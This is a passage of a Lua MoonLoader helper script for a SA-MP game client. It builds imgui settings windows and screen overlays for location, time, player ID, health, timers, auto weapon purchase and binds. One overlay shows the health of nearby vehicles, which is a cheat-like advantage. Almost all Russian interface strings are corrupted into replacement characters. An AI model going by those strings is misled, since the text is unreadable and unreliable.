						if imgui.ToggleButton("tab_overlay2", togglebools.tab_overlay[2]) then config_ini.bools[26] = togglebools.tab_overlay[2].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� �������� �������� ������"))
						if imgui.ToggleButton("tab_overlay3", togglebools.tab_overlay[3]) then config_ini.bools[27] = togglebools.tab_overlay[3].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� ������ ���� � ID �� ������"))
						if imgui.ToggleButton("tab_overlay4", togglebools.tab_overlay[4]) then config_ini.bools[28] = togglebools.tab_overlay[4].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� ���������� � ���������� � ��� ��������"))
						if imgui.ToggleButton("tab_overlay5", togglebools.tab_overlay[5]) then config_ini.bools[29] = togglebools.tab_overlay[5].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� ����������� ������� �� ������ �� ������� (RK)"))
						if imgui.ToggleButton("tab_overlay6", togglebools.tab_overlay[6]) then config_ini.bools[30] = togglebools.tab_overlay[6].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� ���������� ������ AFK"))
						if imgui.ToggleButton("tab_overlay7", togglebools.tab_overlay[7]) then config_ini.bools[31] = togglebools.tab_overlay[7].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� ���������� � ������� ����"))
						if imgui.ToggleButton("tab_overlay8", togglebools.tab_overlay[8]) then config_ini.bools[32] = togglebools.tab_overlay[8].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� ��������� �������� � ����� ���������"))
						if imgui.ToggleButton("tab_overlay9", togglebools.tab_overlay[9]) then config_ini.bools[33] = togglebools.tab_overlay[9].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� ����������� ����������"))
						if imgui.ToggleButton("tab_overlay10", togglebools.tab_overlay[10]) then config_ini.bools[34] = togglebools.tab_overlay[10].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� ���� � ������� �� ������"))
						if imgui.ToggleButton("tab_overlay11", togglebools.tab_overlay[11]) then config_ini.bools[35] = togglebools.tab_overlay[11].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� ������ � �������"))
						if imgui.ToggleButton("tab_overlay12", togglebools.tab_overlay[12]) then config_ini.bools[36] = togglebools.tab_overlay[12].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� �������� ���������� �������"))
						if imgui.ToggleButton("tab_overlay13", togglebools.tab_overlay[13]) then config_ini.bools[37] = togglebools.tab_overlay[13].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� ������� ��������� � ����"))
					--	if imgui.ToggleButton("tab_overlay14", togglebools.tab_overlay[14]) then config_ini.bools[38] = togglebools.tab_overlay[14].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("������������ ���������� ����� ��������"))
						if imgui.ToggleButton("tab_overlay15", togglebools.tab_overlay[15]) then config_ini.bools[41] = togglebools.tab_overlay[15].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� ������ ������� � ����������")) if imgui.IsItemClicked() then maintabs.squad.status.v = true end
						if imgui.ToggleButton("tab_overlay16", togglebools.tab_overlay[16]) then config_ini.bools[43] = togglebools.tab_overlay[16].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ��������� ������������ �������� +500")) if imgui.IsItemClicked() then maintabs.pl500.status.v = true end
						if imgui.ToggleButton("tab_overlay17", togglebools.tab_overlay[17]) then config_ini.bools[44] = togglebools.tab_overlay[17].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ���������� ����������� ����� (/dclean - �������� ����������)"))
						if imgui.ToggleButton("tab_overlay18", togglebools.tab_overlay[18]) then config_ini.bools[52] = togglebools.tab_overlay[18].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("���������� ������� �����������/���������� �����"))
						if imgui.ToggleButton("tab_overlay19", togglebools.tab_overlay[19]) then config_ini.bools[54] = togglebools.tab_overlay[19].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("���������� ������ ������ �� ����� ������ � ��������"))
					end

				if maintabs.tab_settings.status then
						imgui.NewLine()
						imgui.Text(u8("������� ���� ���")) imgui.SameLine(200) imgui.Text(u8("������� ���� �������")) imgui.SameLine(400) imgui.Text(u8("������� ���� ������")) imgui.SameLine(600) imgui.Text(u8("������� ������� ���� (����.: -1; 5 � �.�.)")) imgui.SameLine(850) imgui.Text(u8("������� ���")) imgui.NewLine()
						imgui.PushItemWidth(140)
						imgui.InputText(u8'##fname', guibuffers.settings.fname) imgui.SameLine(200) imgui.InputText(u8'##sname', guibuffers.settings.sname) imgui.SameLine(400) imgui.InputText(u8'##rank', guibuffers.settings.rank) imgui.SameLine(600) imgui.InputText(u8'##time', guibuffers.settings.timep) imgui.PopItemWidth() imgui.SameLine(800) if imgui.ToggleButton("usersex", togglebools.tab_settings[1]) then RP = togglebools.tab_settings[1].v and "�" or "" config_ini.Settings.UserSex = togglebools.tab_settings[1].v and 1 or 0 end imgui.NewLine() 
						if show.othervars.saccess then
							imgui.Text(u8("������� �������� �������������\n(��� �������������)")) imgui.SameLine(200) imgui.Text(u8("������� ��� � �����")) imgui.SameLine(400) imgui.Text(u8("������� ����� ������ ������ (������ �� ������� ����� ������)")) imgui.NewLine()
							imgui.PushItemWidth(140)
							imgui.InputText(u8'##PlayerU', guibuffers.settings.PlayerU) imgui.SameLine(200) imgui.InputText(u8'##tag', guibuffers.settings.tag) imgui.SameLine(400) imgui.InputText(u8'##useclist', guibuffers.settings.useclist) imgui.PopItemWidth() imgui.SameLine(600) imgui.NewLine()
						end
				end

				if maintabs.tab_commands.money.v then
					imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
					imgui.SetNextWindowSize(imgui.ImVec2(510, 500), imgui.Cond.Always)
					imgui.Begin(u8("��������� ����� ������"), maintabs.tab_commands.money, 4 + 2 + 32)
					if imgui.ToggleButton("tab_money1", togglebools.tab_moder[1]) then config_ini.bools[58] = togglebools.tab_moder[1].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("������������ ���������� ����� ������ (��� ����������� ����� �������������� ��� ��������)"))
					imgui.Text(u8("�������� ����������� ��� ���� ������ ����� �� �����")) 
					imgui.PushItemWidth(100) imgui.InputText(u8'##money1', guibuffers.fond.fondcolor) imgui.PopItemWidth() imgui.SameLine() imgui.PushFont(imfonts.fontmoney) imgui.TextColoredRGB(u8("{" .. (guibuffers.fond.fondcolor.v) .. "}$819405828")) imgui.PopFont() imgui.NewLine()
					imgui.Text(u8("�������� ����������� ��� ���� ������ ������ �����")) 
					imgui.PushItemWidth(100) imgui.InputText(u8'##money2', guibuffers.fond.mycolor) imgui.PopItemWidth() imgui.SameLine() imgui.PushFont(imfonts.fontmoney) imgui.TextColoredRGB(u8("{" .. (guibuffers.fond.mycolor.v) .. "}$75729")) imgui.PopFont() imgui.NewLine()
					imgui.End()
				end

				if maintabs.tab_commands.help.v then
						imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
						imgui.SetNextWindowSize(imgui.ImVec2(510, 100), imgui.Cond.Always)
						imgui.Begin(u8("������������� ���������� ����������"), maintabs.tab_commands.help, 4 + 2 + 32)
						imgui.Text(u8("������� ������ ��� ������� ��������� ��� /. ������� ��������� ������� � ����\n��� ��������� ������������. ������� � ������� �������� ��������� �������.\n��������: ����� ����������� �� ��� ������������ ������� �������. ���\n������������ � ������ ������� ������ ������� ������� /commandhelp list � ����."))
						imgui.End()
				end

				if maintabs.pl500.status.v then
						imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
						imgui.SetNextWindowSize(imgui.ImVec2(1000, 300), imgui.Cond.Always)
						imgui.Begin(u8("��������� +500"), maintabs.pl500.status, 4 + 2 + 32)
						imgui.Text(u8("�������� ����������� ��� ���� ������"))
						-- local a, r, g, b = explode_argb(tonumber("0xFF0000"))
						-- local color = imgui.ImFloat3(r, g, b)
						-- local c = "FF0000"
						-- if imgui.ColorEdit3('test', color) then
							-- local clr = join_argb(color.v[1] * 255, color.v[2] * 255, color.v[3] * 255)
							--print(('%06X'):format(clr))
							-- c = ('%06X'):format(clr)
						-- end
						imgui.PushItemWidth(100) imgui.InputText(u8'##plus5001', guibuffers.plus500.plus500color) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("������� ����")) imgui.NewLine()
						-- imgui.PushItemWidth(100) imgui.InputText(u8'##plus5002', guibuffers.plus500.plus500size) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("������� ������ ������ (�� ����� 128)")) imgui.NewLine()
						-- imgui.PushItemWidth(100) imgui.InputText(u8'##plus5003', guibuffers.plus500.plus500font) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("������� ��� ������")) imgui.NewLine()
						imgui.PushFont(imfonts.font500)
						local money = tostring(500 * 3)
						imgui.TextColoredRGB("{" .. guibuffers.plus500.plus500color.v .. "}$" .. money .. "")
						imgui.PopFont()
						imgui.End()  
				end
				
				if maintabs.squad.status.v then
						imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
						imgui.SetNextWindowSize(imgui.ImVec2(1000, 300), imgui.Cond.Always)
						imgui.Begin(u8("��������� ������ ������� � ����������"), maintabs.squad.status, 4 + 2 + 32)
						imgui.Text(u8("�������� ����������� ��� ���� ������")) 
						imgui.PushItemWidth(100) imgui.InputText(u8'##plus5001', guibuffers.squad.fscolor) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("������� ����")) imgui.NewLine()
						imgui.PushFont(imfonts.exFontsquad)
						imgui.TextColoredRGB("{" .. guibuffers.squad.fscolor.v .. "}[14:54:59]  [�����] Aleksandr_Belyankin[583] : �����������, �������. � ����� 20 �������, ����� �����...")
						imgui.TextColoredRGB("{" .. guibuffers.squad.fscolor.v .. "}������ ������")
						imgui.TextColoredRGB("{FFFAFA}Timur_Epremidze [123]")
						imgui.TextColoredRGB("{FFFAFA}Vasiliy_Pupkin [0]")
						imgui.PopFont()
						imgui.End()  
				end
				
				if maintabs.user_keys.status.v then
						imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
						imgui.SetNextWindowSize(imgui.ImVec2(1000, 300), imgui.Cond.Always)
						imgui.Begin(u8("������ ���������������� ������"), maintabs.user_keys.status, 4 + 2 + 32)
						imgui.Text(u8("��� ������������� ����� ������� ��� � ����������� ����� � ������ ����� ����� @. ���� ���� ����� ������� �� ���� �� ����������������� ��������.\n��������: \"��� ID : @MyID@\" ������: \"��� ID : 231\". ������ ������:\n@enter@ - ��������� ������ �� ��������� ������ (�������� " .. tostring(delay) .. " ��.) - �� �������� ��� �������������� ������� Enter � ���������������� �����.\n@Hour@ - ���������� ������� ��� (0-23) ������ ����������\n@Min@ - ���������� ������� ������ (0-60) ������ ����������\n@Sec@ - ���������� ������� ������� ������ ����������\n@Date@ - ���������� ������� ���� � ������� " .. os.date("%d.%m.%Y") .. "\n@MyID@ - ���������� ��� ������� ID\n@KV@ - ���������� ��� ������� �������\n@NearID@ - ���������� ID ����������� � ��� ������\n@NearFName@ - ���������� ��� ����������� � ��� ������\n@NearSName@ - ���������� ������� ����������� � ��� ������\n@clist@ - ���������� �������� �������� ������ � ����������� ������ (������� �31)\n@tid@ - ���������� ID ���������� ������ � �������/�������� ������/��������� ���� (��� ���������� ��������)."))
						imgui.End()
				end

				if maintabs.warnings.status.v then
						imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
						imgui.SetNextWindowSize(imgui.ImVec2(400, 230), imgui.Cond.Always)
						imgui.Begin(u8("��������� �����"), maintabs.warnings.status, 4 + 2 + 32)
						imgui.Text(u8("������ ������� ������� ������������� � ���� ������� ������ �\n����������������� ����. ������ �������: ���� ������� � �������\n� ��������� ����� �� �������� � �� ���������."))
						imgui.NewLine()
						if imgui.ToggleButton("warn0", togglebools.tab_bbot[2]) then config_ini.bools[40] = togglebools.tab_bbot[2].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("������������ �������"))
						imgui.PushItemWidth(500)
						imgui.InputText(u8'##warn1', guibuffers.warnings.war1)
						imgui.InputText(u8'##warn2', guibuffers.warnings.war2)
						imgui.InputText(u8'##warn3', guibuffers.warnings.war3)
						imgui.InputText(u8'##warn4', guibuffers.warnings.war4)
						imgui.PopItemWidth()
						imgui.End()
				end

				if maintabs.auto_bp.status.v then
						imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
						imgui.SetNextWindowSize(imgui.ImVec2(310, 300), imgui.Cond.Always)
						imgui.Begin(u8("��������� ��������������� ������ �� �� ������"), maintabs.auto_bp.status, 4 + 2 + 32)
						if imgui.ToggleButton("bp1", togglebools.auto_bp[1]) then config_ini.bools[18], AutoDeagle = togglebools.auto_bp[1].v and 1 or 0, togglebools.auto_bp[1].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("����� Desert Eagle")) imgui.NewLine()
						if imgui.ToggleButton("bp2", togglebools.auto_bp[2]) then config_ini.bools[19], AutoShotgun = togglebools.auto_bp[2].v and 1 or 0, togglebools.auto_bp[2].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("����� Shotgun")) imgui.NewLine()
						if imgui.ToggleButton("bp3", togglebools.auto_bp[3]) then config_ini.bools[20], AutoSMG = togglebools.auto_bp[3].v and 1 or 0, togglebools.auto_bp[3].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("����� SMG")) imgui.NewLine()
						if imgui.ToggleButton("bp4", togglebools.auto_bp[4]) then config_ini.bools[21], AutoM4A1 = togglebools.auto_bp[4].v and 1 or 0, togglebools.auto_bp[4].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("����� M4A1")) imgui.NewLine()
						if imgui.ToggleButton("bp5", togglebools.auto_bp[5]) then config_ini.bools[22], AutoRifle = togglebools.auto_bp[5].v and 1 or 0, togglebools.auto_bp[5].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("����� Country Rifle")) imgui.NewLine()
						if imgui.ToggleButton("bp6", togglebools.auto_bp[6]) then config_ini.bools[23], AutoPar = togglebools.auto_bp[6].v and 1 or 0, togglebools.auto_bp[6].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("����� �������")) imgui.NewLine()
						if imgui.ToggleButton("bp7", togglebools.auto_bp[7]) then config_ini.bools[24], AutoOt = togglebools.auto_bp[7].v and 1 or 0, togglebools.auto_bp[7].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("���������� ������ �� ������"))
						imgui.End()
				end

				if maintabs.tab_main_binds.gunparams.v then
					imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
					imgui.SetNextWindowSize(imgui.ImVec2(500, 350), imgui.Cond.Always)
					imgui.Begin(u8("��������� ��������������� ������ ������ � ��������������"), maintabs.tab_main_binds.gunparams, 4 + 2 + 32)
					imgui.InputText(u8'##gun1', guibuffers.gunparams.gun1) imgui.SameLine() imgui.Text(u8("- ��������� SD pistol")) imgui.NewLine()
					imgui.InputText(u8'##gun2', guibuffers.gunparams.gun2) imgui.SameLine() imgui.Text(u8("- ��������� Desert Eagle")) imgui.NewLine()
					imgui.InputText(u8'##gun3', guibuffers.gunparams.gun3) imgui.SameLine() imgui.Text(u8("- ��������� Shotgun")) imgui.NewLine()
					imgui.InputText(u8'##gun4', guibuffers.gunparams.gun4) imgui.SameLine() imgui.Text(u8("- ��������� SMG")) imgui.NewLine()
					imgui.InputText(u8'##gun5', guibuffers.gunparams.gun5) imgui.SameLine() imgui.Text(u8("- ��������� M4")) imgui.NewLine()
					imgui.InputText(u8'##gun6', guibuffers.gunparams.gun6) imgui.SameLine() imgui.Text(u8("- ��������� AK47")) imgui.NewLine()
					imgui.InputText(u8'##gun7', guibuffers.gunparams.gun7) imgui.SameLine() imgui.Text(u8("- ��������� Country Rifle")) imgui.NewLine()
					imgui.End()
				end

				if maintabs.rphr.status.v then
						imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
						imgui.SetNextWindowSize(imgui.ImVec2(400, 400), imgui.Cond.Always)
						imgui.Begin(u8("��������� �����"), maintabs.rphr.status, 4 + 2 + 32)
						imgui.Text(u8("���� �� �������� ���� ����� ������� ��������� �������.\n�������������� ���������������� �����."))
						imgui.NewLine()
						imgui.Hotkey("Name42", 42, 100) imgui.SameLine() imgui.Text(u8("������� ���������")) imgui.NewLine()
						imgui.PushItemWidth(500)
						imgui.InputText(u8'##rphr1', guibuffers.rphr.bind1)
						imgui.InputText(u8'##rphr2', guibuffers.rphr.bind2)
						imgui.InputText(u8'##rphr3', guibuffers.rphr.bind3)
						imgui.InputText(u8'##rphr4', guibuffers.rphr.bind4)
						imgui.InputText(u8'##rphr5', guibuffers.rphr.bind5)
						imgui.InputText(u8'##rphr6', guibuffers.rphr.bind6)
						imgui.InputText(u8'##rphr7', guibuffers.rphr.bind7)
						imgui.InputText(u8'##rphr8', guibuffers.rphr.bind8)
						imgui.InputText(u8'##rphr9', guibuffers.rphr.bind9)
						imgui.InputText(u8'##rphr10', guibuffers.rphr.bind10)
						imgui.PopItemWidth()
						imgui.End()
				end

				if guis.updatestatus.status.v then
					imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
					imgui.SetNextWindowSize(imgui.ImVec2(1000, 500), imgui.Cond.Always)
					imgui.Begin(u8("� ���������"), guis.updatestatus.status, 4 + 2 + 32)
					imgui.Text(u8("��� ������"))
					for k, i in ipairs(guis.updatestatus.wn) do imgui.Text(u8(i)) end
					local tt = [[��������������������� �������:
						1) ������������� /eject ��������� � ��������� (��������� ������);
						2) /bugreport - ��������� ��������� ������������;
						3) /bp - ������� (�� ������ �������) ��������� ������� ��������������� ������ ��;
						4) ����� ������� �� ������ ����� CTRL - �������� ������ ����� ������� ��;
						5) /scr exit - ���������� �������;
						6) ������ ������������� ������ piss/iznas - �������������� ��������� (��������� ������);
						7) /toggle - ������� (�� ������ �������) ���������� ������� �������� ������� � �������;
						8) ��������� �� ������ + CTRL - ��������� ������ ������������� �������� � ����� - ���������� - ������� CTRL;
						9) /duel [id] - ������� ���������� ������ �� ����� (�� 12 ��).
					]]
					imgui.Text(u8(tt))
					imgui.End()
				end
				
				imgui.ShowCursor = true
				imgui.End()
				imgui.PopFont()
		end
		-- ###################################### Overlay
		--if config_ini.bools[25] == 1 then
				imgui.SwitchContext()
				colors[clr.WindowBg] = ImVec4(0, 0, 0, 0)
				local SetModeCond = SetMode and 0 or 4
				
				if 1 == 1 then -- config_ini.bools[26] ���������� ����� � �������
						local x, y, z
						if not SetMode then x,y,z = getCharCoordinates(PLAYER_PED) end
						local zone = SetMode and "Doherty" or calculateZone(x, y, z)
						if zone ~= "Unknown" then
								local color = zone == "Restricted Area" and "{FF0000}" or "{FFFAFA}"
								if not SetMode then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_placeX, config_ini.ovCoords.show_placeY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_placeX, config_ini.ovCoords.show_placeY)) end end
								local kv = SetMode and "�-14" or kvadrat()
								imgui.Begin('#empty_field2', show.show_place, 1 + 32 + 2 + SetModeCond + 64)
								imgui.PushFont(imfonts.exFont)
								imgui.TextColoredRGB('' .. color .. '' .. zone .. ' [' .. kv .. ']')
								imgui.PopFont()
								s_place = imgui.GetWindowPos()
								imgui.End()
						end
				end
				
				if config_ini.bools[34] == 1 then -- ���������� �����
						if not SetMode then	imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_timeX, config_ini.ovCoords.show_timeY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_timeX, config_ini.ovCoords.show_timeY))	end end
						imgui.Begin('#empty_field', show.show_time, 1 + 32 + 2 + SetModeCond + 64)
						imgui.PushFont(imfonts.exFont)
						imgui.TextColoredRGB('{FFFF00}' .. os.date("%d.%m.%y %X") .. '')
						imgui.PopFont()
						s_time = imgui.GetWindowPos()
						imgui.End()
				end

				if config_ini.bools[27] == 1 then -- ���������� ��� ��������� � ��� id
						if not SetMode then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_nameX, config_ini.ovCoords.show_nameY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_nameX, config_ini.ovCoords.show_nameY))	end	end
						local result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
						if result then
								local name = sampGetPlayerNickname(id)
								local clist = string.sub(string.format('%x', sampGetPlayerColor(id)), 3)
								local clist = clist == "ffff" and "fffafa" or clist
								imgui.Begin('#empty_field3', show.show_name, 1 + 32 + 2 + SetModeCond + 64)
								imgui.PushFont(imfonts.exFont)
								imgui.TextColoredRGB('{' .. clist .. '}' .. name .. '')
								imgui.SameLine()
								imgui.TextColoredRGB('{' .. clist .. '}[' .. tostring(id) .. ']')
								imgui.PopFont()
								s_name = imgui.GetWindowPos()
								imgui.End()
						end
				end

				if config_ini.bools[28] == 1 then -- ���������� ���������� � ������� �������
						if isCharInAnyCar(PLAYER_PED) then
								local carhandle = storeCarCharIsInNoSave(PLAYER_PED)-- ��������� handle ����������
								local idcar = getCarModel(carhandle) -- ��������� �� ����������
								if not SetMode then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_vehX, config_ini.ovCoords.show_vehY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_vehX, config_ini.ovCoords.show_vehY)) end end
								imgui.Begin('#empty_field4', show.show_veh, 1 + 32 + 2 + SetModeCond + 64)
								imgui.PushFont(imfonts.exFont)
								imgui.TextColoredRGB('{FFFAFA}���������: ' .. tVehicleNames[idcar-399] .. ' [' .. idcar .. ']')
								imgui.PopFont()
								s_veh = imgui.GetWindowPos()
								imgui.End()
						end
				end

				if config_ini.bools[32] == 1 then -- ���������� ���������� � ������� �� �����
						local carhandle
						if isCharInAnyCar(PLAYER_PED) then carhandle = storeCarCharIsInNoSave(PLAYER_PED) end
						local myHP = getCharHealth(PLAYER_PED)
						local myARM = getCharArmour(PLAYER_PED)
						local color, carHP
						if myHP < 30 then color = "{FF0000}" elseif myHP > 30 and myHP < 50 then color = "{FFFF00}" else color = "{00FF00}" end
						if not SetMode then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_hpX, config_ini.ovCoords.show_hpY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_hpX, config_ini.ovCoords.show_hpY)) end end
						imgui.Begin('#empty_field13', show.show_hp, 1 + 32 + 2 + SetModeCond + 64)
						imgui.PushFont(imfonts.exFontl)
						imgui.TextColoredRGB('{87CEFA}' .. myARM .. '')
						if not SetMode then if carhandle ~= nil and carhandle > 0 then carHP = getCarHealth(carhandle) end else carHP = 1000 end
						if carHP ~= nil then imgui.TextColoredRGB('{FFB6C1}' .. carHP .. '') end
						imgui.TextColoredRGB('' .. color .. '' .. myHP .. '')
						s_hp = imgui.GetWindowPos()
						imgui.PopFont()
						imgui.End()
				end

				if config_ini.bools[36] == 1 then -- ���������� �������� ����� ������
						local carhandles = getcars() -- �������� ��� ������ ������
						if carhandles ~= nil then -- ���� ������ ����������
								for k, v in pairs(carhandles) do -- ������� ���� ����� � ����������
										if doesVehicleExist(v) and isCarOnScreen(v) then -- ���� ������ �� ������
												local idcar = getCarModel(v) -- �������� �� ��������
												local myX, myY, myZ = getCharCoordinates(PLAYER_PED) -- �������� ���� ����������
												local cX, cY, cZ = getCarCoordinates(v) -- �������� ���������� ������
												local distanse = math.ceil(math.sqrt( ((myX-cX)^2) + ((myY-cY)^2) + ((myZ-cZ)^2))) -- ���������� ����� ���� � �������
												local ignorecars = {[432] = "Rhino", [520] = "Hydra", [425] = "Hunter"} -- �� ������������ �����
												local motos = {[522] = "NRG-500", [463] = "Freeway", [461] = "PCJ-600", [581] = "BF-400", [521] = "FCR-900", [468] = "Sanchez", [462] = "Faggio"} -- �� ����������
												if ignorecars[idcar] == nil and isLineOfSightClear(myX, myY, myZ, cX, cY, cZ, true, false, false, true, false) and distanse <= 50 then
													-- ���� ������ �� �� ����� ������������, ����� ���� � ������� ��� ���� (��������� � ������ �� ��������� �� �����) � ���������� �� ����� 50 ��...
														local cHP = getCarHealth(v) -- �������� �� ������
														local cPosX, cPosY = convert3DCoordsToScreen(cX, cY, cZ) -- ��������� 3� ���������� ���� � ���������� �� ������
														local col = cHP > 800 and 0xFF00FF00 or cHP > 500 and 0xFFFFFF00 or 0xFFFFFAFA -- �������� ���� ������ � ����������� �� �� ������
														local col = motos[idcar] ~= nil and isCarTireBurst(v, 1) and 0xFFFF0000 or col -- ���� ������ ��������� ������� �� ���� �� ������ �������
														renderFontDrawText(dx9font, cHP, cPosX - (renderGetFontDrawTextLength(dx9font, cHP, false) / 2), cPosY, col, false) -- ������ �����
												end
										end
								end
						end
				end

				if showcmc then -- ���������� ���. ������ ��� ������ �������
							imgui.SetNextWindowPos(imgui.ImVec2(sx - (15 + show.rand), sy - 24 - show.rand))
							imgui.Begin('#empty_field15', showcmc, 1 + 32 + 2 + SetModeCond + 64)
							if not showcmcimage then
									if doesFileExist('Moonloader\\Pictures\\showcmc.png') then
											showcmcimage = imgui.CreateTextureFromFile('Moonloader\\Pictures\\showcmc.png')
											if not showcmcimage then imgui.OpenPopup('Texture Loading Error') end
									else
											imgui.OpenPopup('Texture Loading Error')
									end
							else
									imgui.Image(showcmcimage, imgui.ImVec2(32, 32))
							end
							imgui.End()

							if not spsyns.mode and isKeyDown(vkeys.VK_CONTROL) and lastcarhandle ~= nil and isCharInAnyCar(PLAYER_PED) and getDriverOfCar(storeCarCharIsInNoSave(PLAYER_PED)) == PLAYER_PED then 
								local cl = getVehicleClass(lastcarhandle)
								if cl == 11 or cl == 15 or cl == 16 or cl == 21 or getDriverOfCar(lastcarhandle) == nil or getDriverOfCar(lastcarhandle) == PLAYER_PED then return end
								spsyns.changespeed = false 
								spsyns.tarspeed = 0
								spsyns.car = lastcarhandle 
								spsyns.firstshow = true 
								spsyns.mode = true 
							end
				end

				if sx ~= nil and (crosMode or SetMode) then -- ���������� ���������� � ������� ���� ��� ������
					targetinfo()
				end

				if (config_ini.bools[29] == 1 and RKTimerTickCount ~= nil) or SetMode then
						local rtm = nil
						if not SetMode then
								local RKTo = 300 - (os.time() - RKTimerTickCount)
								if RKTo > 0 then
										local rmn = math.floor(RKTo / 60)
										local rsc = math.fmod(RKTo, 60) >= 10 and math.fmod(RKTo, 60) or "0" .. math.fmod(RKTo, 60) .. ""
										rtm = "" .. rmn ..":" .. rsc .. ""
								else
										rtm = "0:00"
										RKTimerTickCount = nil
										local bass = require "lib.bass" -- ��������� ������
										local radio = bass.BASS_StreamCreateFile(false, "moonloader\\Sounds\\s.wav", 0, 0, 0)
										bass.BASS_ChannelSetAttribute(radio, BASS_ATTRIB_VOL, 0.5) -- ���������
										bass.BASS_ChannelPlay(radio, false) -- �������������
										sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �����. ����� ������������.", 0xFFFF0000)
								end
						end

						if not SetMode then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_rkX, config_ini.ovCoords.show_rkY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_rkX, config_ini.ovCoords.show_rkY)) end end
						rtm = SetMode and "2:52" or rtm
						imgui.Begin('#empty_field5', show.show_rk, 1 + 32 + 2 + SetModeCond + 64)
						imgui.PushFont(imfonts.exFont)
						imgui.TextColoredRGB('{FFFAFA}' .. rtm .. '')
						imgui.PopFont()
						s_rk = imgui.GetWindowPos()
						imgui.End()
				end

				if (config_ini.bools[53] == 1 and BKTimerTickCount ~= nil) or SetMode then
					local rtm = nil
					if not SetMode then
							local RKTo = 35 - (os.time() - BKTimerTickCount)
							if RKTo > 0 then
									local rmn = math.floor(RKTo / 60)
									local rsc = math.fmod(RKTo, 60) >= 10 and math.fmod(RKTo, 60) or "0" .. math.fmod(RKTo, 60) .. ""
									rtm = "" .. rmn ..":" .. rsc .. ""
							else
									rtm = "0:00"
									BKTimerTickCount = nil
							end
					end

					if not SetMode then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_deathX, config_ini.ovCoords.show_deathY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_deathX, config_ini.ovCoords.show_deathY)) end end
					rtm = SetMode and "0:21" or rtm
					imgui.Begin('#empty_field43', show.show_death, 1 + 32 + 2 + SetModeCond + 64)
					imgui.PushFont(imfonts.exFont)
					imgui.TextColoredRGB('{FFFAFA}' .. rtm .. '')
					imgui.PopFont()
					s_death = imgui.GetWindowPos()
					imgui.End()
				end

				if (config_ini.bools[30] == 1 and afkstatus) or SetMode then
